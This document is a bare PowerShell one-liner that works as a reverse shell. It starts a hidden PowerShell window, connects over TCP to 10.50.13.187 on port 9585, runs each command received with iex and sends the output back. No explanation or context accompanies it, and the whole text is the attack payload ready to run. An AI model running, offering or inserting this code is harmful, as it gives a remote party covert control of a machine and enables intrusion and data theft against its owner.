Start-Process $PSHOME\powershell.exe -ArgumentList {$myTcpClient = New-Object System.Net.Sockets.TCPClient('10.50.13.187', 9585);Start-Sleep -Seconds 0.3;$stream = $myTcpClient.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex (". { $data } 2>&1") | Out-String ); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$myTcpClient.Close()} -WindowStyle Hidden